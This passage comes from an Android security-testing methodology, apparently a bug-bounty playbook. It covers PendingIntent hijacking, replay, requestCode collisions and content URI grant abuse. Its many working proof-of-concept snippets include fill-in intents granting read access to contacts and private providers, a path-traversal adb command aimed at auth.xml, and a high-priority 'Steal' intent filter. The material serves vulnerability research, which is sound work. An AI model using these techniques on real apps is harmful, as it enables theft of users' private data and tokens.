    fill.setData(Uri.parse("content://com.android.contacts/data"));
    fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
    try { pi.send(this, 0, fill); } catch (Exception e) { Log.e("D08", "", e); }
  }
  ```
  ```bash
  adb logcat | grep -E 'D08|sbn'
  ```
- **Proof:** The victim app performing the wrapped action, or handing over a granted URI, triggered from
  your listener process. Contact records in your log read by an app that never requested `READ_CONTACTS` is
  the clean version.
- **Escalation:** → D24 for notification-content theft; → D13 if the notification carries an OTP. Pair with
  a tapjacking PoC (D04) only if the programme prices user interaction — otherwise state the precondition
  and let it lower the rating honestly. Nextcloud's report rated **Low 1.3** precisely because of this
  precondition; the same class rates far higher where no special grant is needed.
- **Ruled out when:** Every notification PendingIntent is `FLAG_IMMUTABLE` with an explicit component
  (verified in the D08-003 census, not the source), or the app posts no notifications carrying actionable
  PendingIntents. Victim-side mitigations to note: `FLAG_IMMUTABLE` plus `FLAG_ONE_SHOT`, and keeping the
  OTP out of the notification text.

### D08-041 · `getCreatorPackage()` / `getCreatorUid()` used to authenticate the *sender*

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the gated branch is an auth decision |
| **Attacker** | AM-04 (acquisition via notification listener), AM-03 where the PendingIntent is handed out through an exported component |
| **Applies to** | all. The `getSentFromUid()` remedy is **API 34+** only, so pre-34 apps have no clean receiver-side fix — which is why the broken pattern persists |
| **Maps to** | `risks/sender-of-pending-intents` — "`PendingIntent.getCreator*()` and `PendingIntent.getTarget*()` return the creator … not its sender", "The creator does not always match the sender"; impact listed as authentication bypass, privilege escalation, and "Remote Code Execution: depending on implementation"; documented alternatives `Binder.getCallingUid()` + `PackageManager.getPackagesForUid()`, or `BroadcastReceiver.getSentFromUid()` / `getSentFromPackage()` on API 34+ with `BroadcastOptions.setShareIdentityEnabled(true)`; MASVS-CODE |

- **Test:** The receiving side of the class. An app that takes a `PendingIntent` from elsewhere and decides
  whether to act on it by calling `getCreatorPackage()`/`getCreatorUid()` is checking who **created** the
  token, not who **sent** it. Any app that can obtain a legitimately created PendingIntent — notably via a
  notification listener — becomes the sender while the creator stays trusted.
- **How:**
  ```bash
  grep -rnE 'getCreatorPackage|getCreatorUid|getTargetPackage|getIntentSender' out/sources/ -B4 -A8
  ```
  For each hit determine whether the result feeds an `if` that gates a privileged action. Then relay:
  ```java
  StatusBarNotification sbn = getActiveNotifications()[0];
  PendingIntent pi = sbn.getNotification().contentIntent;   // created by the trusted app
  Intent handoff = new Intent().setClassName("com.target.app", "com.target.app.PiReceiver");
  handoff.putExtra("pi", pi);
  startActivity(handoff);                                    // sent by YOU
  ```
- **Proof:** The victim taking the creator-gated branch while the sending process is yours — a logcat line
  from the victim's handler captured alongside `adb shell ps | grep com.attacker.poc` showing your PID as
  the caller. The clean framing: creator says `com.trusted`, sender is `com.attacker.poc`, branch executed.
- **Escalation:** → D13 auth bypass; → D06 if the gated path is a bound service. This is the
  notification-listener × PendingIntent join in D28.
- **Ruled out when:** Every authorisation decision on a received PendingIntent uses `Binder.getCallingUid()`
  inside a Service or ContentProvider dispatch (plus `getPackagesForUid()` **and** a signature check), or
  `BroadcastReceiver.getSentFromUid()`/`getSentFromPackage()` on API 34+. A `getCreatorPackage()` used only
  for logging or telemetry is a true negative — confirm it does not reach a branch.

### D08-042 · Missing `FLAG_ONE_SHOT` on a non-idempotent PendingIntent → replay

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null); financial replay argues into the programme's payment category |
| **Attacker** | AM-03, AM-04 |
| **Applies to** | all |
| **Maps to** | `risks/pending-intent#risk_replaying_pending_intents` — "PendingIntents can be replayed unless the `FLAG_ONE_SHOT` flag is set"; AOSP `PendingIntent.java` — `FLAG_ONE_SHOT`: "this PendingIntent can be used only once … after `send()` is called on it, it will be automatically canceled", and the documented risk that an attacker "could capture and re-use the intent to repeat actions that should only be able to be done once (e.g., one-time transactions, account verifications)"; mindedsecurity `MSTG-PLATFORM-4_2` (bitmask test `$D & 0x40000000 > 0`) |

- **Test:** A PendingIntent representing a one-time action — confirm payment, consume a voucher, complete a
  transfer, verify an account — that is not created with `FLAG_ONE_SHOT` (0x40000000) can be fired
  repeatedly by anyone who obtains it. This is orthogonal to mutability: an **immutable** PendingIntent is
  still replayable.
- **How:**
  ```bash
  grep -rn 'PendingIntent.get' out/sources/ | grep -v 'FLAG_ONE_SHOT'
  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|verify|voucher|coupon|redeem'
  ```
  Use the D08-003 Frida census to read the flags bitmask at creation, then capture the token (notification,
  widget, alarm, exported extra) and:
  ```java
  for (int i = 0; i < 5; i++) { pi.send(); Thread.sleep(500); }
  ```
- **Proof:** N backend transactions, N verification events or N state changes from one user action, visible
  in the app's own transaction list and in the proxy history. Show the request count, not just a
  screenshot: this is a state-change finding, so use the five-screenshot pattern (D08-066).
- **Escalation:** → D23 payment fraud; see D08-050 for the payment-specific composition.
- **Ruled out when:** Every PendingIntent representing a non-idempotent action carries `FLAG_ONE_SHOT`,
  **or** the backend enforces idempotency server-side (an idempotency key, a one-time nonce, or a state
  machine that rejects the second call) — prove that by replaying and showing the second request rejected,
  not by reading the client.

### D08-043 · `filterEquals()` + constant `requestCode` collision, with or without `FLAG_UPDATE_CURRENT`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) when the misroute exposes another user's content; `broken_access_control.privilege_escalation` (null) otherwise |
| **Attacker** | AM-05 (another user of the same app) for the misrouted-message variant; AM-03 for the extras-swap variant |
| **Applies to** | all |
| **Maps to** | AOSP `PendingIntent.java` javadoc, verbatim: "A common mistake people make is to create multiple PendingIntent objects with Intents that only vary in their 'extra' contents, expecting to get a different PendingIntent each time. This does not happen." Matching uses `Intent.filterEquals()` plus the `requestCode` int — extras are **not** part of identity; also "FLAG_UPDATE_CURRENT still works even if FLAG_IMMUTABLE is set"; `develop/ui/views/notifications/build-notification` — "If you reuse a `PendingIntent`, a user might reply to a different conversation than the one they intend" |

- **Test:** Two `PendingIntent`s whose base intents are `filterEquals()`-equal and whose request codes
  match are the **same object**. Extras do not disambiguate them. So a per-conversation, per-order or
  per-item PendingIntent built in a loop with `requestCode = 0` collides, and `FLAG_UPDATE_CURRENT` makes a
  later creation silently rewrite the extras of every outstanding copy — including across privilege
  contexts, and including when `FLAG_IMMUTABLE` is set.
- **How:**
  ```bash
  grep -rn 'FLAG_UPDATE_CURRENT\|requestCode' out/sources/ -B4 -A2
  # PendingIntents built in a loop with a constant request code:
  grep -rnE 'PendingIntent\.get(Activity|Broadcast|Service)\(\s*\w+,\s*0\s*,' out/sources/ -B10
  grep -rnE 'PendingIntent\.get(Activity|Service|Broadcast)\([^,]+,\s*([0-9]+)' out/sources/ -A4 | grep -n 'FLAG_UPDATE_CURRENT'
  ```
  The D08-003 hook prints `rc=` per creation — a constant value across items is the tell. Reproduce:
  post two notifications (or open two orders), act on the second, observe which one the backend sees.
- **Proof:** Replying to conversation A delivers to conversation B, or confirming order A charges order B —
  captured in the backend request, not inferred. Two notifications, one misrouted action, one proxy
  request naming the wrong object id.
- **Escalation:** → D24 cross-conversation message disclosure; → D23 when it is an order or a payment.
  **Important on Android 15+:** force-stop cancels all of an app's pending intents, so do not force-stop
  between setup and trigger (D08-051).
- **Ruled out when:** Every per-item PendingIntent uses a unique `requestCode` derived from the item id
  (read the derivation, and confirm it with the census `rc=` values), or the base intents differ under
  `filterEquals()` by action or data URI rather than only by extras.

### D08-044 · Direct-reply `RemoteInput` PendingIntent — legitimately mutable, so audit what that exposes

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for the misroute; `broken_access_control.privilege_escalation` (null) for the retarget |
| **Attacker** | AM-04 |
| **Applies to** | all messaging, ticketing and support apps with inline reply |
| **Maps to** | `develop/ui/views/notifications/build-notification` (the `FLAG_MUTABLE` requirement for direct reply and the requestCode caution); AOSP `PendingIntent.java`; `risks/sender-of-pending-intents` |

- **Test:** Direct reply genuinely requires `FLAG_MUTABLE` — the system fills in the typed text. That means
  every direct-reply notification ships a mutable PendingIntent that a notification listener can obtain and
  `send()` with an arbitrary fill-in. The mitigation is not immutability; it is a tightly specified base
  intent (explicit component **and** package) plus a per-conversation `requestCode`. Do not report "mutable
  PendingIntent" here without that analysis — you will be correctly rebutted.
- **How:**
  ```bash
  grep -rn -B10 -A4 'RemoteInput\|addRemoteInput\|KEY_TEXT_REPLY' out/sources/
  # verify the base Intent sets a component AND a unique requestCode per conversation
  ```
  Then, from the listener stub, capture the reply PendingIntent and fill in a *different* conversation id
  or a different data URI:
  ```java
  Intent fill = new Intent();
  fill.putExtra("conversation_id", victimOtherThreadId);
  RemoteInput.addResultsToIntent(action.getRemoteInputs(), fill, results);
  action.actionIntent.send(ctx, 0, fill);
  ```
- **Proof:** The message delivered to the wrong recipient, or a component other than the reply handler
  invoked — visible in the backend request and in the other user's thread.
- **Escalation:** → D24; → D08-043 when the collision is the mechanism.
- **Ruled out when:** The reply PendingIntent's base intent sets an explicit `ComponentName`, the target
  conversation is encoded in the **base** intent (not fillable), and the `requestCode` is per-conversation.
  All three, verified from the census output.

### D08-045 · Widget `setPendingIntentTemplate()` with an attacker-influenced `fillInIntent`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null) |
| **Attacker** | AM-09 (server content chooses the launch target), AM-03 where the item data comes from an exported provider or the app's cache |
| **Applies to** | apps with collection-based widgets |
| **Maps to** | `develop/ui/views/appwidgets` (`setOnClickPendingIntent`, `setPendingIntentTemplate` plus fill-in for collections); `risks/pending-intent`; MASWE-0032 |

- **Test:** Collection widgets use one template PendingIntent plus a per-item `fillInIntent`. The
  template's unfilled fields are precisely what the fill-in may supply. If the template omits the component
  or the action, the fill-in supplies it — and widget item data frequently originates from server content
  or from the app's own cache. So *content* controls a launch. Widget code lives outside the main feature
  tree, which is why it is rarely reviewed.
- **How:**
  ```bash
  grep -rnE 'setPendingIntentTemplate|setOnClickFillInIntent|setOnFillInIntent|RemoteViewsService|RemoteViewsFactory|getViewAt\(' out/sources/ -A10
  adb shell dumpsys appwidget | sed -n '/Provider/,/Host/p'
  ```
  For each `setPendingIntentTemplate`, read the base Intent: does it set component **and** action, or only
  an action? Then feed the widget's data source a crafted item — via a MitM'd response, the app's exported
  provider, or by writing its cache — and tap it.
- **Proof:** The component that the injected item named launching under the app's UID
  (`dumpsys activity activities`), with the injected item visible in the widget.
- **Escalation:** High if the template is under-specified; Medium if only extras are fillable but those
  extras drive a router. A widget that also performs the action (tap-to-pay from the home or lock screen)
  chains into D23.
- **Ruled out when:** Every `setPendingIntentTemplate` base intent sets both an explicit component and an
  action, and the per-item fill-in supplies only opaque identifiers that the target validates
  server-side — confirmed by reading `getViewAt()` and the handling component.

### D08-046 · Slice `primaryAction` PendingIntent fired by a host on your behalf

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 (any app able to obtain slice permission), plus the app's own hosts |
| **Applies to** | apps shipping AndroidX Slices — declining in prevalence, so almost never reviewed |
| **Maps to** | `guide/slices/getting-started` (provider XML, `android.app.slice.category.SLICE`, `onBindSlice`); `risks/pending-intent`; MASWE-0036 |

- **Test:** A slice's `primaryAction` is a PendingIntent built by the app, handed to a host (Assistant,
  search) and fired by the host. If the action targets a privileged internal screen and the slice URI is
  attacker-influenceable, the host becomes your launcher — and the slice provider is exported by design.
- **How:**
  ```bash
  grep -nB2 -A10 'android.app.slice.category.SLICE' out/AndroidManifest.merged.xml
  grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|SliceAction|createDeeplink|primaryAction|grantSlicePermission|checkSlicePermission' out/sources/ -A8
  adb shell content query --uri 'content://com.target.app/<path>'
  ```
- **Proof:** A slice URI path that maps to an internal screen, plus the corresponding PendingIntent target
  recorded from the bound slice, plus non-idempotent behaviour observable from the bind (a proxy request, a
  file written, account data in the slice row titles).
- **Escalation:** → D07 for the provider surface; slice content is rendered by the Assistant, which widens
  the disclosure audience.
- **Ruled out when:** The app ships no `SliceProvider`, or `onBindSlice` branches only on a closed set of
  known paths and every `SliceAction` PendingIntent is `FLAG_IMMUTABLE` with an explicit component.

### D08-047 · PendingIntent handed out over AIDL, `IntentSender` or a `Bundle` extra

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (null, CWE-269) |
| **Attacker** | AM-03 (no user grant needed — this is the acquisition path that beats D08-040 on rating) |
| **Applies to** | all |
| **Maps to** | `risks/pending-intent`; `risks/sender-of-pending-intents`; Oversecured Samsung category "PendingIntent Hijacking" (IDs 167, 178, 179, 180); AOSP "AIDL overview" |

- **Test:** The notification drawer is the famous acquisition route and the weakest one, because it costs a
  user grant. The strong routes are the quiet ones: a PendingIntent returned from an exported service's
  binder call, put into a broadcast extra, returned in an `onActivityResult` Intent, or handed to a
  third-party SDK. Enumerate every way a `PendingIntent` or `IntentSender` leaves the process.
- **How:**
  ```bash
  grep -rnE 'putExtra\([^,]+,\s*\w*[Pp]endingIntent|setContentIntent|addAction\(|getIntentSender\(|IntentSender' out/sources/
  grep -rn 'PendingIntent' out/sources/ | grep -iE 'aidl|Stub|onBind|Parcel|writeToParcel'
  ls out/sources/**/I*$Stub* 2>/dev/null; grep -rn 'extends .*\$Stub' out/sources/ -A20 | grep -in 'PendingIntent'
  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'
  ```
  Then bind or broadcast from the stub and pull the token out of the reply Bundle.
- **Proof:** Your unprivileged app in possession of a live PendingIntent created by the victim — print
  `pi.getCreatorPackage()` and `pi.getCreatorUid()` from your process — followed by a successful
  `send(ctx, 0, fill)`. Because no user grant was involved, this variant rates materially higher than
  D08-040; say so explicitly in the severity paragraph.
- **Escalation:** → D06 for the binder surface itself; then D08-037/D08-042/D08-052 for what you do with
  the token.
- **Ruled out when:** No `PendingIntent`/`IntentSender` crosses the process boundary except inside
  notifications, or every one that does is `FLAG_IMMUTABLE` + `FLAG_ONE_SHOT` with an explicit component —
  verified from the D08-003 census, which sees SDK-created tokens your grep will not.

### D08-048 · Background-activity-launch opt-ins on a PendingIntent handed to third parties

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the phishing outcome argues toward `server_side_injection.content_spoofing.external_authentication_injection` (P4) only if the triager insists — lead with credential capture instead |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | targetSdk 34+ for the sender opt-in, 35+ for the creator opt-in; `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` is available from SDK 36; `IntentSender.sendIntent()` sender opt-in is documented as arriving at API 37+ |
| **Maps to** | `guide/components/activities/background-starts` (`setPendingIntentBackgroundActivityStartMode()` sender opt-in at API 34+, `setPendingIntentCreatorBackgroundActivityStartMode()` creator opt-in at API 35+, `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` recommended at SDK 36+, `StrictMode.VmPolicy.Builder().detectBlockedBackgroundActivityLaunch()`, the `realCallingPackage`/`callingPackage` log fields); `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` — "PendingIntent creators block background activity launches by default" |

- **Test:** Android 15 blocks background activity launches from PendingIntents by default. An app that
  opts back in — especially with the unconditional `MODE_BACKGROUND_ACTIVITY_START_ALLOWED` rather than the
  `ALLOW_IF_VISIBLE` mode — has re-granted whoever holds that token the ability to interrupt the user at
  will. That is the substrate for StrandHogg-style phishing on modern devices.
- **How:**
  ```bash
  grep -rnE 'setPendingIntent(Creator)?BackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_(ALLOWED|DENIED|ALLOW_IF_VISIBLE)|BIND_ALLOW_ACTIVITY_STARTS' out/sources/
  ```
  ```kotlin
  StrictMode.setVmPolicy(StrictMode.VmPolicy.Builder()
      .detectBlockedBackgroundActivityLaunch().penaltyLog().build())   // Android 16+
  ```
  ```bash
  adb logcat -s ActivityTaskManager | grep -E 'realCallingPackage|callingPackage|BAL'
  ```
- **Proof:** `ActivityTaskManager` log lines naming `realCallingPackage` (sender) and `callingPackage`
  (creator), with a background activity actually appearing on screen while the attacker app has no visible
  window. Record the mode constant found in code next to the log line.
- **Escalation:** → D04 UI redress and credential capture; also a `bindService()` with
  `BIND_ALLOW_ACTIVITY_STARTS` exposed to an untrusted binder client is the same grant by another route.
- **Ruled out when:** No opt-in call exists (the platform default denies), or the only call uses
  `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE`, or the PendingIntent carrying it never leaves the app.
  Note the BAL gate cuts both ways: it is also what makes the D08-061 consent chain conditional.

### D08-049 · Notification trampoline removal that traded a UX bug for this one

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | inherits the PendingIntent finding it enables |
| **Attacker** | AM-04 |
| **Applies to** | targetSdk 31+ |
| **Maps to** | `about/versions/12/behavior-changes-12` — trampoline restriction, the exact logcat string `Indirect notification activity start (trampoline) from PACKAGE_NAME, this should be avoided for performance reasons.`, and the `NOTIFICATION_TRAMPOLINE_BLOCK` compat change |

- **Test:** At targetSdk 31 a service or receiver used as a notification trampoline may not call
  `startActivity()`. The common remediation was to replace the trampoline with a direct
  `setContentIntent()` PendingIntent — and apps that did so frequently made it **mutable**, or pointed it
  at an intent-forwarding activity. Audit the replacement, not the original.
- **How:**
  ```bash
  adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
  adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app     # debuggable builds
  grep -rn 'setContentIntent(' out/sources/ -B6 -A3 | grep -nE 'FLAG_MUTABLE|new Intent\(\)|Redirect|Router|Deeplink|Proxy'
  ```
- **Proof:** A notification action built with `FLAG_MUTABLE` and no component set, or one whose explicit
  component is itself a redirector — plus the D08-037 exploitation of that specific token.
- **Escalation:** → D08-040 for acquisition; → D24.
- **Ruled out when:** Every `setContentIntent`/`addAction` PendingIntent is `FLAG_IMMUTABLE` with an
  explicit component that is not a forwarder — check the target component's code, because an immutable
  PendingIntent pointing at a redirector is still exploitable through the redirector's own extras.

### D08-050 · Payment PendingIntent replay and misrouting, composed

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for the misroute; direct financial impact for the replay |
| **Attacker** | AM-03, AM-04 |
| **Applies to** | all apps with in-app payment, transfer, top-up or subscription confirmation |
| **Maps to** | `risks/pending-intent`; AOSP `PendingIntent.java` |

- **Test:** Compose D08-042 and D08-043 against the payment flow specifically, because that is where the
  two combine into a Critical rather than a curiosity: a missing `FLAG_ONE_SHOT` on a "confirm payment"
  PendingIntent yields replay; a constant `requestCode` across orders yields misrouting, so confirming
  order A charges order B.
- **How:**
  ```bash
  grep -rn -B10 'PendingIntent.get' out/sources/ | grep -inE 'pay|order|checkout|charge|transfer|confirm|topup|subscribe'
  ```
  Run both probes against the same token and record the backend state after each.
- **Proof:** N charges from one confirmation, or a confirmation applied to the wrong order — evidenced in
  the backend transaction list **and** the proxy history, with pre-state and post-state captured (D08-066).
  A screenshot of the client UI alone is not proof of a charge.
- **Escalation:** → D23 for the wider entitlement and fraud surface; → D15 if the backend accepts the
  replayed request without an idempotency key.
- **Ruled out when:** The confirmation PendingIntent carries `FLAG_ONE_SHOT` and a per-order
  `requestCode`, **or** the backend rejects the second submission with an idempotency error — shown by the
  replayed request's response, not by reading the client.

### D08-051 · Control for Android 15 force-stop cancelling PendingIntents

| | |
|---|---|
| **Severity ceiling** | Support (prevents a false negative) |
| **VRT** | none |
| **Attacker** | AM-12 |
| **Applies to** | Android 15+ |
| **Maps to** | `about/versions/15/behavior-changes-15` — the system cancels all pending intents when an app enters the stopped state; `ApplicationStartInfo.wasForceStopped()` |

- **Test:** On Android 15+ the system cancels **all** of an app's pending intents when it enters the
  stopped state. Force-stopping the target between PoC setup and PoC trigger silently invalidates the
  token, and the result looks exactly like "the app is not vulnerable". This is a methodology trap, and it
  is also a finding source in its own right — widgets and alarms silently dead after a force-stop.
- **How:**
  ```bash
  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # before
  adb shell am force-stop com.target.app
  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # after: records gone
  grep -rn 'wasForceStopped\|ApplicationStartInfo' out/sources/
  ```
- **Proof:** The PendingIntent records present before and absent after in `dumpsys activity intents`.
  Include this in the negative-result register so a failed PendingIntent PoC is recorded as inconclusive
  rather than clean.
- **Escalation:** Re-run every PendingIntent item without force-stopping in between.
- **Ruled out when:** The device under test is below Android 15, or the PoC sequence provably never
  force-stopped the target (record the command history).

### D08-052 · PendingIntent whose base Intent carries `FLAG_GRANT_*` — `send()` issues the grant

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-03, AM-04 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0381; MASTG-KNOW-0117; `risks/pending-intent`; ATT&CK T1635 Steal Application Access Token |

- **Test:** The two halves of this chapter meet here. A PendingIntent fires **as the creator**, so a
  fill-in that adds `FLAG_GRANT_READ_URI_PERMISSION` and a `content://` data URI makes the victim grant
  *you* access to its own provider — no nested-intent forwarder required anywhere in the app. Conversely, a
  PendingIntent whose base intent already sets grant flags and leaves the data URI unset is a
  grant-issuing machine waiting for your `fillIn()`.
- **How:** From the D08-003 census, list every PendingIntent whose base intent (a) has grant flags set, or
  (b) has no data URI set while being mutable. Then:
  ```java
  Intent fill = new Intent();
  fill.setClassName("com.attacker.poc", "com.attacker.poc.LeakActivity");
  fill.setData(Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
  fill.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
              | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
  fill.setClipData(ClipData.newRawUri("d", Uri.parse("content://com.android.contacts/data")));
  pi.send(context, 0, fill);
  ```
  Note `setClipData` is a second, frequently unstripped channel for URIs that ride the same grant flags.
- **Proof:** `dumpsys activity permissions` showing the grant held by your UID after the `send()`, and the
  bytes read in your process. Negative control: the same `openInputStream` before the `send()` throws.
- **Escalation:** → D08-012 for persistence; → D07 for the provider contents; → D11/D13/D15 for the token.
- **Ruled out when:** No PendingIntent is mutable (D08-037 ruled out) **and** no base intent sets
  `FLAG_GRANT_*`, or the target provider has no grantable authority (D08-006). Check `setClipData` as well
  as `setData` before writing the negative.

### D08-053 · `grantUriPermission()` called with a caller-supplied package name

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the granted path holds a token |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-KNOW-0117; MASTG-TEST-0357; `risks/content-resolver`; ATT&CK T1409 |

- **Test:** The app-initiated version of the grant bug. Code that calls
  `grantUriPermission(callerPackage, uri, flags)` using a package name taken from the intent, or a URI
  built from an intent parameter, creates a standing grant to whoever asked — no redirection primitive
  needed.
- **How:**
  ```bash
  grep -rn 'grantUriPermission(' out/sources/ -B8 -A4
  grep -rn 'revokeUriPermission(' out/sources/            # the counterpart; its absence is half the finding
  grep -rn 'getUriForFile(' out/sources/ -B6 -A4          # attacker-supplied path reaching the URI builder
  ```
  Fire it with your own package name and a path you choose:
  ```bash
  adb shell am start -n com.target.app/.ShareActivity \
    --es target_package com.attacker.poc \
    --es path '../../../../data/data/com.target.app/shared_prefs/auth.xml'
  adb shell dumpsys activity permissions | grep -A5 com.attacker.poc
  ```
  ```
  dz> run app.activity.start --component com.target.app com.target.app.ShareActivity \
        --data-uri content://com.target.app.provider/private/1 \
        --flags GRANT_READ_URI_PERMISSION ACTIVITY_NEW_TASK
  dz> run app.provider.read content://com.target.app.provider/private/1
  ```
- **Proof:** `dumpsys activity permissions` showing a standing READ grant to `com.attacker.poc`, and
  `getContentResolver().openInputStream(uri)` succeeding from the PoC — a read that failed before the
  grant-carrying intent and succeeds after it, from the same unprivileged UID.
- **Escalation:** → D07 (combine with a traversal-capable `openFile` for arbitrary private-file read);
  → D08-012 if the grant is persistable.
- **Ruled out when:** Every `grantUriPermission` call uses a package name the app derived itself (from
  `getCallingPackage()` on a `startActivityForResult` path, or a hard-coded partner) **and** the URI is
  built from an app-controlled path with a canonicalisation check, **and** a matching `revokeUriPermission`
  runs when the flow ends.

### D08-054 · Outbound implicit intent carrying grant flags → resolver hijack

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) or `.for_publicly_accessible_asset` (P1) by payload |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0374 (References to Implicit Intents Carrying Sensitive Extras), rule `mastg-android-implicit-intent-leaking-extras`; `risks/intent-redirection`; ATT&CK T1635.001 URI Hijacking — ATT&CK's detection guidance explicitly says to "encourage explicit intents over implicit ones" and "verify destination app signing certificates during application vetting" |

- **Test:** The direction nobody tests: the target **sending** an implicit intent that carries
  `FLAG_GRANT_READ_URI_PERMISSION` and a sensitive `content://` URI. Whichever app wins resolution receives
  the grant — and you arrange to win by registering a matching filter with a high priority.
- **How:**
  ```bash
  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/ -B6 \
    | grep -nE 'new Intent\("|setAction\(|createChooser\(|ACTION_SEND|ACTION_VIEW'
  grep -rn 'new Intent\(\s*"' out/sources/ | grep -v 'setPackage\|setComponent\|setClassName'
  adb shell cmd package resolve-activity --brief -a android.intent.action.SEND -t 'image/*'
  adb shell dumpsys package r android.intent.action.SEND
  ```
  Register the competing handler in the stub:
  ```xml
  <activity android:name=".Steal" android:exported="true">
    <intent-filter android:priority="999">
      <action android:name="android.intent.action.SEND"/>
      <category android:name="android.intent.category.DEFAULT"/>
      <data android:mimeType="*/*"/>
    </intent-filter>
  </activity>
  ```
  ```java
  Intent i = getIntent();
  Log.i("D08", "action=" + i.getAction() + " data=" + i.getData()
      + " clip=" + i.getClipData() + " extras=" + i.getExtras());
  getContentResolver().openInputStream(i.getClipData().getItemAt(0).getUri());
  ```
  Confirm the resolver actually picked you before claiming it:
  ```bash
  adb shell am start -a android.intent.action.SEND -t 'image/*' -f 0x00000008   # FLAG_DEBUG_LOG_RESOLUTION
  adb logcat -d | grep -iE 'resolve|Resolver|PackageManager|ActivityTaskManager'
  ```
- **Proof:** `adb logcat -s D08` in the attacker app printing the victim's URI and the bytes behind it,
  plus `dumpsys activity permissions` showing the grant to your UID, plus the resolution trace naming your
  component. Make the finding about the **extras and the granted URI**, not about "an app can see which
  URIs are opened" — several programmes (Grab, Spotify) explicitly exclude the latter.
- **Escalation:** → D05 for the broader implicit-intent hijack surface; → D09 when the payload is an OAuth
  callback. An OS chooser dialog counts as one user tap — say so and price it honestly; a `setPackage`-less
  **service** bind has no chooser at all.
- **Ruled out when:** Every outbound intent carrying grant flags sets an explicit component or package, or
  uses `createChooser()` **and** the payload contains nothing sensitive (verify by logging the extras, not
  by reading the builder).

### D08-055 · Persistable grant retention after the share is "over"

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-03 + one user share action |
| **Applies to** | all; the grant dies on target-app uninstall — state that in the report |
| **Maps to** | `risks/pending-intent` and `risks/sender-of-pending-intents` cover the grant-transfer direction; MASTG-KNOW-0117; ATT&CK T1533 |

- **Test:** The lifecycle question nobody asks. When the target shares a `content://` URI with
  `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, the receiver calls `takePersistableUriPermission()` and keeps
  read access across reboots and across the target's own notion of "revoked" — until the target explicitly
  calls `revokeUriPermission()`. For a medical record, a contract, an ID scan or a disappearing message,
  the finding is that **delete does not delete**.
- **How:** Receive a legitimate share into the stub app, then:
  ```java
  getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
  ```
  ```bash
  adb reboot && adb wait-for-device
  adb shell dumpsys activity providers | sed -n '/Granted Uri Permissions/,/^$/p'
  # then delete the item in the target's UI and re-read from the stub
  adb shell am start -n com.attacker.poc/.ReReadActivity
  grep -rnE 'FLAG_GRANT_PERSISTABLE_URI_PERMISSION|revokeUriPermission|grantUriPermission' out/sources/
  ```
- **Proof:** `dumpsys activity providers` listing the persisted grant to the attacker package after a
  reboot, and the attacker still reading the file bytes after the user deleted the item in the UI. Take the
  pre-state (item present), the deletion, and the post-state read as three captures.
- **Escalation:** → D20 (data retained beyond the user's control); if multiple users' documents are
  reachable through one grant, the PII standard applies.
- **Ruled out when:** The app never sets `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, or it calls
  `revokeUriPermission()` on deletion and the post-deletion re-read throws `SecurityException` — prove that
  by re-reading, not by finding the revoke call.

### D08-056 · `android:requireContentUriPermissionFromCaller` absent on a URI-consuming activity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ (API 35) for the attribute; the underlying confused deputy works on all versions, which is why its absence on a modern app is worth calling out |
